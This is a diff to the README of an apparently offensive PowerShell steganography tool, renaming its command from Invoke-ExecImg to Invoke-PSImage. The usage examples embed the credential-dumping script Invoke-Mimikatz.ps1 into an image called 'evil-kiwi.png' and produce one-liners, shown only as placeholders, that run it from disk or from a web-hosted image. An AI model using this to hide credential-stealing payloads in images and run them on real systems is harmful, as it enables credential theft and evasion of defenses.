@@ -25,14 +25,14 @@ You will need to host the image and insert the URL into the command.
 ## Example
 Create an image with the script "Invoke-Mimikatz.ps1" embeded in it and output a oneliner to execute from disk:
 ```
-PS>Import-Module .\Invoke-ExecImg.ps1
-PS>Invoke-ExecImg -Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-kiwi.png
+PS>Import-Module .\Invoke-PSImage.ps1
+PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-kiwi.png
    [Oneliner to execute from a file]
 ``` 
 Create an image with the script "Invoke-Mimikatz.ps1" embeded in it and output a oneliner to execute from the web (you still have to host the image and edit the URL):
 ```
-PS>Import-Module .\Invoke-ExecImg.ps1
-PS>Invoke-ExecImg -Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-kiwi.png -Web
+PS>Import-Module .\Invoke-PSImage.ps1
+PS>Invoke-PSImage -Script .\Invoke-Mimikatz.ps1 -Image .\kiwi.jpg -Out .\evil-kiwi.png -Web
    [Oneliner to execute from the web]
 ``` 
 Executing an image hosted on the web:
